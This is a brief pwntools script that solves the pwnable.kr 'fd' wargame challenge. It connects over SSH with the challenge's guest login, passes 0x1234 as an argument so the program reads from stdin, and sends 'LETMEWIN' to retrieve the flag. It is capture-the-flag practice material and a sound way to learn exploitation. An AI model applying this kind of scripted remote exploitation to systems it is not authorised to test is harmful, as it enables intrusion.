from pwn import *

s = ssh(host='pwnable.kr', port=2222, password='guest', user='fd')

p = str(0x1234)
fd_process = s.process(["./fd", p])

fd_process.sendline("LETMEWIN")

print(fd_process.recvall().decode())
